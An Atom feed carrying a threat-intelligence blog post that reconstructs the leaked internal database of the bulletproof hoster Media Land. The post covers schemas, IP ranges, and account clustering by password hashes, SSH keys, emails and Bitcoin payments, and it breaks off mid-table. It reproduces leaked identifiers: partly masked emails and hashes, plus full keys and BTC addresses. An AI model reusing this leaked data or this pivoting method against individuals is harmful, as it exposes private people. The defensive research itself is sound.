<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2025-11-28T10:32:13+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Disclosing.Observer</title><subtitle>Test
</subtitle><author><name>Max</name><email>mhvanderhorst@tudelft.nl</email></author><entry><title type="html">The Anatomy of a Bulletproof Hoster: A Data-Driven Reconstruction of Media Land</title><link href="http://localhost:4000/2025/11/24/bulletproof-hoster-anatomy-data-driven-reconstruction.html" rel="alternate" type="text/html" title="The Anatomy of a Bulletproof Hoster: A Data-Driven Reconstruction of Media Land" /><published>2025-11-24T00:00:00+01:00</published><updated>2025-11-24T00:00:00+01:00</updated><id>http://localhost:4000/2025/11/24/bulletproof-hoster-anatomy-data-driven-reconstruction</id><content type="html" xml:base="http://localhost:4000/2025/11/24/bulletproof-hoster-anatomy-data-driven-reconstruction.html"><![CDATA[<blockquote>
  <p><strong>Summary:</strong>
This post uses the leaked internal database of Media Land, a sanctioned bulletproof hosting provider, to reconstruct how its platform organised customers, subscriptions, virtual machines, and IP address space across billing, compute, and network layers. By rebuilding the schema locally and pivoting on stable identifiers such as user IDs, SSH keys, and payment records, it derives operational profiles and highlights clusters of accounts that behave like resellers in terms of subscriptions, address allocations, and cryptocurrency payments. The same internal IP assignment history is then cross-referenced with public indicators linked to the Black Basta ransomware group, producing a set of 74 Media Land customer accounts that at some point managed IPs later mentioned in the Black Basta leak, including one large reseller-style account. While this does not attribute specific individuals, it shows how internal hosting records can illuminate the supply chain that underpins ransomware operations and support more structural forms of threat intelligence.</p>
</blockquote>

<p>On 28 March 2025, internal data from Media Land, a hosting provider repeatedly linked to bulletproof services, was <a href="https://cyberpress.org/threat-actor-exposes-data/">leaked online</a>. The material first appeared on Telegram and was later referenced by public reporting, exposing information about Media Land’s backend systems and the infrastructure used to facilitate cybercrime activities. <a href="https://x.com/PRODAFT/status/1909342469617053720">According to PRODAFT</a>, the leaked data contains information about server purchases, financial transactions, payment methods (including cryptocurrency), and some personally identifiable information of Media Land’s users. Half a year later, on 19 November 2025, the UK, US, and Australia <a href="https://www.gov.uk/government/news/uk-smashes-russian-cybercrime-networks-responsible-for-attacks-on-uk-businesses">announced</a> new sanctions targeting Media Land. The announcement explicitly referenced the role of resilient hosting infrastructures in enabling large scale attacks on European businesses.</p>

<p>This post uses the leaked Media Land dataset to give a data-driven reconstruction of how a bulletproof hoster is organised. By rebuilding the database structures and analysing subscription records, instance histories, and IP allocation logs, we can map structural patterns in the platform’s operations. These patterns include the separation of core infrastructure and customer infrastructure, distinctive behavioural profiles, such as large-volume address consumers and unusually large payments originating from single accounts.</p>

<p>In what follows, I first reconstruct how Media Land’s internal systems fit together as a hosting platform. This is an interesting insight in itself. Then, I look at how different customer segments used that infrastructure in practice, before finally linking internal records to external indicators of compromise, focusing on Black Basta.</p>

<p>The objective is to show how bulletproof hosting infrastructures organise, allocate, and recycle address space. Additionally, this post aims to explore how this type of leak can be used for threat intelligence by cross-referencing and pivoting into previously observed abuse indicators.</p>

<h1 id="contents-of-the-media-land-leak">Contents of the Media Land Leak</h1>
<p>If table-level details are not your thing, you can safely skim this section and jump ahead to “Reconstructing Customer Activity and Resource Allocation”, where I focus on behavioural patterns.</p>

<p>The Media Land leak provides a rare internal view into how a criminal (monolithic) hosting platform handles its internal registration over time. Rather than being a single snapshot, several tables record longitudinal history, which lets us reconstruct lifecycle patterns and infrastructure use as well.</p>

<p>At a high level, the leak spans three layers:</p>
<ul>
  <li><strong>Customer and billing layer:</strong> who the platform considered a customer, what they bought, and whether those purchases were active or cancelled. Here, Media Land’s incomplete customer tracking already shows a clear lack of Know Your Customer processes.</li>
  <li><strong>Compute and service layer:</strong> what virtual instances existed, how they changed state, and which users controlled them.</li>
  <li><strong>Network layer:</strong> which IP addresses were assigned, when, and to whom, including both IPv4 and IPv6 ranges.</li>
</ul>

<p>The most operationally useful part is that these layers are linkable by stable identifiers. This makes it possible to pivot from a user account to subscriptions, from subscriptions to assigned IP space, and from those IPs to observed operational behaviour over time.</p>

<h2 id="tables-in-scope">Tables in Scope</h2>
<p>The leak contains a coherent snapshot of the internal data model used by Media Land’s hosting platform. The exposed tables fall into several functional domains that together describe users, subscriptions, virtual infrastructure, IP allocations and billing activity across PostgreSQL, MySQL, VMManager, IPMI, VXLAN, KVM, Libvirt, and Ceph. Although each table on its own is limited, the combination provides a nearly complete view of how customers, servers, and addresses are linked inside the platform. This section describes what each group represents and how they fit together.</p>

<p><img src="../../../assets/medialand_overview.png" alt="" />
<span class="centered-text">Figure 1: Overview of the Media Land database leak</span></p>

<h3 id="user-and-account-records">User and Account Records</h3>
<p>The platform distinguishes between two concepts that behave like “user accounts”. The <em>user_user</em> table stores the identity of real human customers for as far as they fill in accurate details, while <em>vm_account</em> contains the operational accounts that interact with the virtual infrastructure. In practice, these two usually belong to the same person and share the same identifier, but they appear in different tables because infrastructure operations and billing operations are handled by separate subsystems. Both tables ultimately link into billing, network assignments, and virtual machine activity.</p>

<h3 id="billing-and-payment-data">Billing and Payment Data</h3>
<p>A cluster of billing tables records how customers subscribe to virtual machines, how renewals occur, and which payments were issued. The central element is <em>billing_subscription</em>, which ties users to active or cancelled services, often paid for in Russian Rubles. Related tables track add-ons, balance adjustments, and historical actions. One notable table is <em>billing_bitcoin_payment</em>, which confirms that Media Land supported cryptocurrency payments and used price and amount tracking fields rather than a simple “paid or not paid” flag. This makes the billing system an important source of behavioural information, because subscription patterns and payment histories correlate strongly with reseller activity.</p>

<h3 id="virtual-machine-lifecycle-and-provisioning">Virtual Machine Lifecycle and Provisioning</h3>
<p>The provisioning subsystem consists of tables that represent virtual machines and their state changes. The table <em>hosting_instance</em> stores the current state of a VM, while <em>hosting_instance_history</em> records every creation, deletion, and migration event. The <em>hosting_instance_issues</em> table contains operational faults such as failed provisioning or host-level errors. Together, these tables document how customers interacted with the platform: how many VMs they deployed, how often they recycled them, and whether they were running high-churn infrastructure.</p>

<h3 id="host-nodes-and-assigned-ip-addresses">Host Nodes and Assigned IP Addresses</h3>
<p>The infrastructure layer covers the physical or virtual host nodes and the addresses routed to them. The <em>vm_host</em> table lists the compute nodes that run customer VMs. <em>vm_ip</em> represents individual addresses assigned on those nodes, including their address, IP family, and the account to which they were bound. This layer sits closest to the boundary between customer behaviour and internal operations, because it reflects real resource consumption and routing-level behaviour.</p>

<h3 id="network-assignment-and-ip-history">Network Assignment and IP History</h3>
<p>The network subsystem manages how IP addresses and prefixes move between users and virtual machines. The most important table here is <em>network_ip_history</em>, which logs every address assignment with timestamps, assignment type, and associated VM or subscription. This table provides a historical record of how the address space was used over time and is one of the strongest indicators of reseller behaviour. A smaller table, <em>network_customer_prefix</em>, records IPv4 or IPv6 prefixes delegated to specific customers.</p>

<h3 id="administrative-controls-and-internal-operations">Administrative Controls and Internal Operations</h3>
<p>The leak also exposed a small set of administrative tables that reveal how Media Land structured internal access and oversight. These include the admin accounts themselves, some credentials, their roles and associated permissions, and a login history that records when staff accessed management interfaces. They instead act as a map of Media Land’s internal control surface, showing which administrator accounts existed, what privileges they were assigned, and how often they logged in. This information does not necessarily indicate malicious intent, but it provides valuable context for understanding the separation between operational automation and human intervention inside the platform.</p>

<h1 id="putting-together-the-infrastructure">Putting Together the Infrastructure</h1>
<p>The Media Land leak exposes a fully integrated hosting platform where authentication, billing, compute orchestration, and network provisioning operate as one tightly coupled system. The tables show how each subsystem feeds the next. User records link directly into subscriptions, subscriptions trigger virtual machine provisioning, and provisioning events produce IP allocations that appear in the network history. This creates a clear end-to-end chain from customer identity to infrastructure footprint.</p>

<p>Several architectural patterns stand out. Media Land separates human-facing accounts from infrastructure-facing accounts, yet both feed into the same subscription and network assignment logic. Billing events act as the operational trigger for most downstream activity. The compute subsystem is structured around lifecycle events rather than a static configuration record, which suggests that provisioning and instance management relied heavily on automated workflows. The network subsystem captures every address assignment in granular detail, which makes it possible to reconstruct how blocks were used and how often they moved between customers.</p>

<p>The presence of VXLAN overlays, saga workers, and IPMI references points to a modern orchestration stack built around asynchronous tasks and network virtualization. The MySQL side of the leak confirms that the platform handled both customer-visible resources and underlying host node coordination. This design resembles a compact, self-hosted cloud environment rather than a simple VPS reseller panel. That structure matters, because it gives us an end-to-end path from “who is the customer?” to “which IPs did they actually use, and when?”. This is what I turn to next.</p>

<h2 id="address-space-and-external-routing-context">Address Space and External Routing Context</h2>
<p>The infrastructure layer also reveals how Media Land organised and utilised its public IP space. The leaked data shows that customers were provisioned with addresses drawn from a small but distinct collection of IPv4 and IPv6 ranges:</p>

<p>IPv4</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">45.141.84.0/24</code></li>
  <li><code class="language-plaintext highlighter-rouge">45.141.85.0/24</code></li>
  <li><code class="language-plaintext highlighter-rouge">45.141.86.0/24</code></li>
  <li><code class="language-plaintext highlighter-rouge">45.141.87.0/24</code></li>
  <li><code class="language-plaintext highlighter-rouge">91.220.163.0/24</code></li>
  <li><code class="language-plaintext highlighter-rouge">91.240.242.0/24</code></li>
  <li><code class="language-plaintext highlighter-rouge">194.26.29.0/24</code></li>
  <li><code class="language-plaintext highlighter-rouge">194.26.69.0/24</code></li>
  <li><code class="language-plaintext highlighter-rouge">77.221.134.0/24</code></li>
</ul>

<p>IPv6</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">2a0b:7ec0:1320::/48</code></li>
  <li><code class="language-plaintext highlighter-rouge">2a0b:7ec0:533::/48</code></li>
</ul>

<p>Important to note is that the range <code class="language-plaintext highlighter-rouge">91.240.242.0/24</code> is registered as being used by customers in <em>network_ip_history</em>, but has since been reallocated to <em>sevencloud.ru</em>. Therefore, this could show up in the leak but is no longer part of the Media Land infrastructure. Moreover, the range <code class="language-plaintext highlighter-rouge">77.221.134.0/24</code> is listed internally as <em>NL Subnet</em>, which checks out as it is part of a sister company called <em>ML Cloud Ltd</em> and geolocates to the Netherlands instead of Russia. The <em>vm_host_log</em> table suggests that this subnet is used for customer-facing hypervisor pools. For as far as Media Land still owns the prefixes, all of these ranges are announced under AS206728.</p>

<p>These blocks account for every address observed in the leak, all originating from AS206728 and AS215376. The IP allocation behaviour shows that these prefixes were treated as a shared pool available to many users at the same time, rather than as dedicated ranges tied to individual customers. These ranges can therefore be monitored in passive DNS, BGP announcements, and future threat intelligence feeds to track the re-emergence of related infrastructure.</p>

<h1 id="reconstructing-customer-activity-and-resource-allocation">Reconstructing Customer Activity and Resource Allocation</h1>
<p>The structure of the leaked data makes it possible to follow a customer from initial signup to full infrastructure usage. Each user in <em>auth_user</em> or <em>vm_account</em> spawns one or more subscriptions. These subscriptions then act as the source for all provisioning activity. Customers with a large number of subscriptions often show up as heavy users of instance history, IP allocation, and prefix movements. In other words, we can move from a static picture of tables to a dynamic view of how different kinds of customers actually used the platform over time.</p>

<p>The <em>hosting_instance_history</em> table, as mentioned, logs every creation event, deletion, migration, or restart. By grouping these records by <em>user_id</em>, patterns can be derived that differentiate casual customers from high-volume renters. Some users create only one or two machines, others create thousands, often within tightly clustered time windows, which is typical of either automation or panel reselling activity. Instance events correlate strongly with IP allocation patterns in <em>network_ip_history</em>, where the same users accumulate large numbers of addresses across a small number of parent blocks.</p>

<p>Resource allocation becomes especially visible when following the lifecycle of an IP. Every address in <em>network_ip_history</em> includes the user, subscription, entity type, and assignment event. By aggregating these assignments, it becomes possible to identify users who consistently draw from the same small set of IPv4 /24s or IPv6 /48s. Some of these patterns reflect normal internal pooling, while others indicate users who received unusually continuous portions of the same parent ranges, which suggests structured access rather than random allocation (in line with reseller structures).</p>

<p>The combined compute and network perspective reveals three distinct customer types:</p>
<ul>
  <li><strong>Allocators:</strong> a small group that receives a wide spread or parent blocks, often at higher levels of exclusivity.</li>
  <li><strong>Shared-pool heavy users:</strong> a larger group that receives many IP addresses but almost always from the same four parent ranges.</li>
  <li><strong>Typical customers:</strong> users with small numbers of subscriptions and instance events.</li>
</ul>

<p>This division does not confirm reseller activity on its own but it highlights operational segments that behave differently inside the platform. Additionally, the allocator group may as well consist of internal testing, as the subscription IDs for the allocators show a high volume of services for which none are paid. The state of these services consistently display a <em>canceled</em> state.</p>

<p>By reconstructing these flows across subscriptions, histories, and network events, the leak allows a detailed look into how Media Land allocated resources and how specific customers used them. The observable patterns and volatility align with the known behaviour of infrastructure used for frequently replaced operations such as malware distribution, phishing, or command and control nodes. Interpretation, however, requires caution and should remain grounded in structural evidence rather than speculation.</p>

<h1 id="operational-indicators-and-threat-intelligence-value">Operational Indicators and Threat-Intelligence Value</h1>
<p>The structural reconstruction of Media Land’s systems is useful for understanding how the platform functioned internally, but the leak also offers practical intelligence that can support ongoing detection efforts. Up to this point, the focus has been on what the leak tells us about Media Land itself. From here on, I use the same data to extract operational indicators that can support threat hunting and attribution work. Because the data spans user activity, instance lifecycles, and entire IP-assignment history, it enables the extraction of stable behavioural patterns that extend beyond the specific IP ranges and ASNs currently associated with Media Land.</p>

<p>The following sections will dive into the data to do some analysis with the goal of linking Media Land users to observed abuse.</p>

<h2 id="preparing-the-data-for-analysis">Preparing the Data for Analysis</h2>
<p>Before talking about specific findings, it is worth briefly outlining how I turned the raw dump into something I could analyse. As shown in Figure 1, the raw dump spans multiple subsystems: billing, lifecycle management, network assignments, authentication, and each uses its own timestamp formats, identifiers, and schemas. To find more patterns, the individual subsystems can be programmatically referenced using the identifiers (representative for the edges in Figure 1). In particular, the user identifiers reoccur in various different places. This will allow us to build profiles.</p>

<p>All tables in the PostgreSQL were rebuilt using <code class="language-plaintext highlighter-rouge">pg_restore</code> program, allowing for a locally hosted version of the databases. All tables were then loaded into a Jupyter notebook as Pandas dataframes. Identifier columns (<em>user_id</em>, <em>subscription_id</em>) were cast to string to ensure table-stable joins, and temporal fields like start and end datetimes were unified to timezone-aware UTC.</p>

<p>Columns were harmonised based on semantic equivalence (such as <em>created_at</em>, <em>registered_at</em>, or <em>date_joined</em> all representing account creation) so that downstream logic could operate on normalized fields.</p>

<h2 id="profile-construction">Profile Construction</h2>
<p>To make sense of individual user behaviours, the normalised data was consolidated into Markdown <em>profiles</em>. Each profile captures information linked to a given user identifier:</p>
<ul>
  <li>Email addresses</li>
  <li>Password hashes</li>
  <li>SSH public keys</li>
  <li>Bitcoin transactions</li>
  <li>Full IP-assignment history</li>
</ul>

<p>The logic is straightforward: start at the user id, pivot to the <em>user_user</em> table and locate the account tied to the user id, then do the same for any cryptocurrency billing, virtual machines, and IP assignments. This allows us to read the dataset not as a collection of tables, but as longitudinal traces of individual resource users.</p>

<p><img src="../../../assets/profile_overview_medialand.png" alt="" />
<span class="centered-text">Figure 2: Example profile rebuilt from the Media Land leak</span></p>

<h1 id="findings-from-user-and-infrastructure-behaviour">Findings From User and Infrastructure Behaviour</h1>
<p>With the profiles in place, we can finally look at how different actors behaved inside Media Land’s infrastructure: who used large amounts of IP space, how email and payment patterns clustered, and where SSH key reuse ties seemingly separate accounts together. These findings are of course not claims about intent, but observations about how infrastructure was used within the platform. For the same reason, I will not include any full email addresses and PII in this post but will partially redact them instead. The full details remain confined to the research environment.</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">user_id</th>
      <th style="text-align: left">email</th>
      <th style="text-align: left">ssh_keys</th>
      <th style="text-align: right">uniq_ips</th>
      <th style="text-align: right">BTC payments</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">93ad06b4-c186-431e-82d2-33ac2fad4e62</td>
      <td style="text-align: left">pra******90@gmail.com</td>
      <td style="text-align: left">1</td>
      <td style="text-align: right">1213</td>
      <td style="text-align: right">1</td>
    </tr>
    <tr>
      <td style="text-align: left">8c22c958-bbc6-4dd8-b7b8-c64506a754ff</td>
      <td style="text-align: left">zah******@gmail.com</td>
      <td style="text-align: left">2</td>
      <td style="text-align: right">1201</td>
      <td style="text-align: right">10</td>
    </tr>
    <tr>
      <td style="text-align: left">e5249019-ce0f-43d0-8b2d-a5f1a68d5265</td>
      <td style="text-align: left">ait******@gmail.com</td>
      <td style="text-align: left">1</td>
      <td style="text-align: right">1122</td>
      <td style="text-align: right">2</td>
    </tr>
    <tr>
      <td style="text-align: left">be6f972d-54e1-49c5-9710-38f42ef8a58d</td>
      <td style="text-align: left">faz******hir@gmail.com</td>
      <td style="text-align: left">2</td>
      <td style="text-align: right">1102</td>
      <td style="text-align: right">4</td>
    </tr>
    <tr>
      <td style="text-align: left">b122f10a-6cc6-4a2f-a7e5-3d980d581eac</td>
      <td style="text-align: left">sen******h@gmail.com</td>
      <td style="text-align: left">2</td>
      <td style="text-align: right">1070</td>
      <td style="text-align: right">2</td>
    </tr>
    <tr>
      <td style="text-align: left">87b7b188-f67f-48b4-8e35-76488896f8e8</td>
      <td style="text-align: left">mon******a@gmail.com</td>
      <td style="text-align: left">3</td>
      <td style="text-align: right">1003</td>
      <td style="text-align: right">0</td>
    </tr>
  </tbody>
</table>

<p><span class="centered-text">Listing 1: Example information about accounts</span></p>

<h2 id="email-address-and-password-patterns">Email Address and Password Patterns</h2>
<p>Most accounts had hashed passwords tied to them, but the surrounding metadata reveals repeated patterns of throwaway email providers, multiple user IDs controlled through the same email address, some addresses linked to tens of subscriptions and hundreds of IP assignments, or even a case of password re-use. When combining email clustering with SSH keys, BTC payments, and IP (re)allocation, specific operational clusters can be discovered: isolated groups of accounts that share provisioning patterns, payment patterns, SSH keys, and display handover coordination through resource reallocation. These clusters do not necessarily correspond to individuals, but they possibly represent operational entities inside Media Land’s infrastructure.</p>

<table>
  <thead>
    <tr>
      <th>user_id</th>
      <th style="text-align: left">email</th>
      <th style="text-align: center">password_hash</th>
      <th style="text-align: right">name</th>
      <th>created_at</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1f2ae72c-de28-47b9-8be0-f5026cd48c23</td>
      <td style="text-align: left">te***********om@protonmail.com</td>
      <td style="text-align: center"><code class="language-plaintext highlighter-rouge">$2b$13$sDurL1.0/9QlBOCsIjVLr.Xn********************kdXGiTDRL</code></td>
      <td style="text-align: right">NaN</td>
      <td>2024-07-08 16:43:22.662</td>
    </tr>
    <tr>
      <td>8f728d4a-687e-4aea-bd8d-b44256f5b30c</td>
      <td style="text-align: left">gr******sov@mail.ru</td>
      <td style="text-align: center"><code class="language-plaintext highlighter-rouge">$2b$13$sDurL1.0/9QlBOCsIjVLr.Xn********************kdXGiTDRL</code></td>
      <td style="text-align: right">Мистер Ресселер</td>
      <td>2021-12-29 21:05:35.504</td>
    </tr>
  </tbody>
</table>

<p><span class="centered-text">Listing 2: Single case of password reuse across accounts</span></p>

<p>As listed above, there was a single case of password reuse, leading to the discovery of another account that was created nearly three years prior. Now, of course it is possible that people use the same passwords. However, with 1666 total observed users, it is unlikely, which means we could consider these two accounts as potentially belonging to the same person. Interestingly, the name this person has given to the account is Мистер Ресселер, translating to “Mister Reseller”.</p>

<p>Additionally, there was a high degree of (disposable) email (re)use. Examples of recurring domains are:</p>
<ul>
  <li>emailbbox.pro</li>
  <li>emailcbox.pro</li>
  <li>emaildbox.pro</li>
  <li>emailfoxi.pro</li>
  <li>linshiyouxiang.net</li>
  <li>tempmailto.org</li>
</ul>

<p>For most of these throwaway emails, there is only a single subscription for 250 RUB that is deleted after some time. However, there is also one email address that has 40 accounts attached to it by numbering accounts. As such, there is a list of users with email addresses like:</p>
<ul>
  <li>mvm*****1+1@gmail.com</li>
  <li>mvm*****1+2@gmail.com</li>
  <li>mvm*****1+58@gmail.com</li>
  <li>mvm*****1+1@mail.ru</li>
  <li>mvm*****1+54@mail.ru</li>
</ul>

<p>These accounts also contain a significant number of Bitcoin payments, showing 12 payments amounting to a total of ~34.08 Bitcoin (which, taken into account registered BTC values at the moment of the transaction, makes a total of RUB 44,494,110.00, or EUR 488.824,31) paid to Media Land between July and October 2022 by this entity, each time with a different BTC address. While not conclusive, the payment amounts, number of IP assignments, and number of accounts suggest that this could be a reseller brokering access to Media Land infrastructure. Following the transactions does not seem to lead to a clear BTC address associated with Media Land and there were no users found that used the same Bitcoin address to make payments.</p>

<table>
  <thead>
    <tr>
      <th>email</th>
      <th style="text-align: left">payment code</th>
      <th style="text-align: center">address</th>
      <th style="text-align: center">amount (fiat)</th>
      <th style="text-align: center">bitcoin_price_value</th>
      <th style="text-align: left">bitcoin_amount_value</th>
      <th style="text-align: left">status</th>
      <th style="text-align: right">created_at</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>mvm*****1+58@gmail.com</td>
      <td style="text-align: left">PMTvc3e4NQX4v45NAXpaG2Yq44NJ8MpCSeXNh6wnBYrSpcTxQcTfK</td>
      <td style="text-align: center">32MeTrsYDKdMvFo8kLS45xd6o5JDCb666R</td>
      <td style="text-align: center">RUB 12000.0</td>
      <td style="text-align: center">RUB 1404780.40</td>
      <td style="text-align: left">0.008542</td>
      <td style="text-align: left">CONFIRM</td>
      <td style="text-align: right">2022-07-08 17:05:10.733</td>
    </tr>
    <tr>
      <td>mvm*****1+24@gmail.com</td>
      <td style="text-align: left">PMTv4acx5euFy97KpERK1G4nitVbMyzmfrwL332dcnmdq6seZMjQu</td>
      <td style="text-align: center">3MNoaJjBZ4yRutatQZX2s9r8LmyshrTMCc</td>
      <td style="text-align: center">RUB 35500.0</td>
      <td style="text-align: center">RUB 1290603.46</td>
      <td style="text-align: left">0.027507</td>
      <td style="text-align: left">CONFIRM</td>
      <td style="text-align: right">2022-08-25 00:55:07.227</td>
    </tr>
  </tbody>
</table>

<p><span class="centered-text">Listing 3: Example transactions</span></p>

<h2 id="automatically-generated-ssh-keys">(Automatically Generated) SSH Keys</h2>
<p>Users that had made a purchase often also had an SSH key associated with this machine. These were either SSH keys uploaded by the users themselves or keys that were automatically generated. The automatically generated keys follow the same naming convention and include the day they were generated:</p>

<table>
  <thead>
    <tr>
      <th>email</th>
      <th style="text-align: left">comment</th>
      <th style="text-align: left">key</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>ant*******dinov@sshvps.net</td>
      <td style="text-align: left">ssh-vps-****dinov</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAoFZcPJ+gM01bnjuD3tZZGDWKAbjL+er6QpOs9W6SG7jp9rGp22X5aKnKVmnC6ENpDzOPveKAS5FPnWOmMLhBoSHZM7Q3+1S6YB+Kq+XrHHKcQ04sdFjH2rCn5o7cvy0U1Rit73aD5NSLMyxi5/NEXkQnQVNegBQeNDZdJuSFQ9hWXS8RFrXgtMoXspTnyq+wNywaS/gz8MTP9WJVq+WLT4pjdBA2sBKawtF3gGcEZ4clov5xnL4E9n2I572pyFOiESBim9aYEY5hKQlcCLBKcVS2QCd8z3Ny0rIckA1pziB+wQgmFoENsTax4EbWjdecAWhN0mwTjREz+6yf2KEMiw== rsa-key-20221011</code></td>
    </tr>
    <tr>
      <td>mju****erro@gmail.com</td>
      <td style="text-align: left">ead</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTKSnbaptHMi8NoFo9mgSjEFq8kp01n5rPUatkFyGsfdY8EELwWzs84nUshvDReeXZcXqu1sSio7cXls2UHPsoQaPm8jBI0GxM7oq2apm7yIE1QswmbL0R02IO4iTM6RR131Q2czDa8fTRcYAe8cdG3ZZkUkNAn1di9UJadeLlHeR4AA9fQDLEU0Q2WLCPpmgXKzLylnoOWXR2CYIfRLqyPrq8TfcbMwKXAiUcE7i5NFg7aTCMfz5JQQfpisSY4o9iLmtx8dp3jzl7xQtu+avGgTAz7nTv9N45N6fvxbgQKuo+KUScZA1IEYI2aagq0wzDIgM/SPyw+sh49NU3klB9 rsa-key-20240725</code></td>
    </tr>
    <tr>
      <td>roc****phin@ex.ua</td>
      <td style="text-align: left">1</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCN8EVkuuMcmcb0o+Mi8mZWNMLOEgnNWkzfp+e89W9fh6uGGALR7AuvZK4s7t/0LxZVHe2hqm1YL6PiSkGtAlHCCwDaXEwl+35DBO+l/WZlxarFZoRpuy3fmWAIsqE+ReDHOCOGv1bB18cpfyg2pL4fMDGDe/6pcHJFG0G+6Z+e3oPCDtWzvlfDGPFMpSEmbspjpwW5v28VkSf0kPkXOi1M4SZBKcEhQIfik6mCIzSb47OGSjk8tk566uUOvapLZb2EwzGxn4ZBJaFFQnG+SOxgFpmtitniz59GyMJ+5R6nd226xS8XKYgUPMI5z5vs+qwgAOGq79uHSg16g9Kt1myb rsa-key-20220214</code></td>
    </tr>
    <tr>
      <td>mvm*****1+2209@gmail.com</td>
      <td style="text-align: left">Пользователь Старый</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrWJQojQB7rUOpiyDEdsAUva0o/c2T6Kx4AQvbDEq3Awo2+yJ4TmWw9n24u0XH8c3UYzQUoO+UM+Vh0Klg7p4SpAvkbKFtmj1bs9T6fwX5Pesh4BryFrpW6zGctsmOlJ8Ns/XWG0PUUtBFlByJrBloa1Trn0xJqo8nUO07m5NNl96vSje3m/2PysqRcW4y189+JRgT1uIcejHjBQsGQqbwpz47WK89AODSgY3ssrYgjRdoEz7FD1BUCzW8l9gWoXK4xoNmrgIbXqFsDT8a7yq4LpLxMMZ2Q5UwLO4jAd2SG7XzddPk/tOtAb+Im9OkL0l277HeGx/jupOCsT+vz2fzkSBjtGjuFS0oJC6LFJeeEGP6gHbnjP45VumYnSo7pgWa/uWswz8buuchieUKT3X92dXbNGO8h1mpuOgkzGz55zI5DY6405YW0g5waJocvAQQRs6oF/v5VcktIEHGg9Dn+44vfxbafu6ESijfVTm72sL6irp5shnNm2X06xuS5LE= valentina@valentina-ubuntu</code></td>
    </tr>
    <tr>
      <td>mvm*****1+4@gmail.com</td>
      <td style="text-align: left">нннн</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrWJQojQB7rUOpiyDEdsAUva0o/c2T6Kx4AQvbDEq3Awo2+yJ4TmWw9n24u0XH8c3UYzQUoO+UM+Vh0Klg7p4SpAvkbKFtmj1bs9T6fwX5Pesh4BryFrpW6zGctsmOlJ8Ns/XWG0PUUtBFlByJrBloa1Trn0xJqo8nUO07m5NNl96vSje3m/2PysqRcW4y189+JRgT1uIcejHjBQsGQqbwpz47WK89AODSgY3ssrYgjRdoEz7FD1BUCzW8l9gWoXK4xoNmrgIbXqFsDT8a7yq4LpLxMMZ2Q5UwLO4jAd2SG7XzddPk/tOtAb+Im9OkL0l277HeGx/jupOCsT+vz2fzkSBjtGjuFS0oJC6LFJeeEGP6gHbnjP45VumYnSo7pgWa/uWswz8buuchieUKT3X92dXbNGO8h1mpuOgkzGz55zI5DY6405YW0g5waJocvAQQRs6oF/v5VcktIEHGg9Dn+44vfxbafu6ESijfVTm72sL6irp5shnNm2X06xuS5LE= mvmpp@LAPTOP-9M7611VJ</code></td>
    </tr>
  </tbody>
</table>

<p><span class="centered-text">Listing 4: SSH key reuse throughout the leak</span></p>

<p>Similarly, the earlier discussed account used the same naming conventions over various keys, allowing further tracking of related accounts by using the key name as a pivot point. Comments for such keys include phrases like <em>Пользователь Старый</em>, which translates to <em>Old User</em>. Where the key name <code class="language-plaintext highlighter-rouge">mvmpp@LAPTOP-9M7611VJ</code> is quite anonymous, <code class="language-plaintext highlighter-rouge">valentina@valentina-ubuntu</code> gives away more information.</p>

<p>Using the SSH keys as a pivot point, there were 344 unique SSH keys of which 4 keys could be used to cluster multiple accounts together:</p>

<table>
  <thead>
    <tr>
      <th>cluster</th>
      <th style="text-align: left">emails</th>
      <th style="text-align: left">key</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td style="text-align: left">14****u5@comparisions.net, fe*****o@linshiyouxiang.net</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrCEG74WDUJsaCtN/8y9/YIneh3MKgVugC/nG61diMurea3QFOuA1yWxDIWkWgXj0jz9Tz6XnQv8laBu28hAAS2hJJlFRpK8h6gFY9Wg6DheG1LIl18tVg/07keaCrqbFIP6VOcJe+mUAdUbDHF4Dt5Turc008X4V0JML0LqAWPV9WLfXvBJnTNzV/fkTJQKDCIgXDLxII3uav9VD/hmIyXmAJBTfJG+s3eXOn7zthCyVhXzfzK6KiEduAp/Zmkf0JYUQy9pFrTFq37lleAHbcRjmLVzvaga/PDDOXQr7gc9qGrNhLsycg6iM49nO1j30YEBturtcBwQzamBoLpXwbs0Ap1bwsRsFbgIYvtuxejxnXy7fkUms2Mp140VvBCGAQll3o63oMLj5yNVw2aXUK3ay3IS29e15w8zJAJjggEUQAEZqwBt1Na3MwPkHiZ256UKVg4F4UiJCxZMogXruoKm+OajMLdlTgLDOsXqhoLcvrf+Q331d1ekDj3MfkN7c= administrator@PC-202207021402</code></td>
    </tr>
    <tr>
      <td>2</td>
      <td style="text-align: left">Cluster of 17 accounts, example: ait*****8@gmail.com, faz********r@gmail.com, server******7@gmail.com</td>
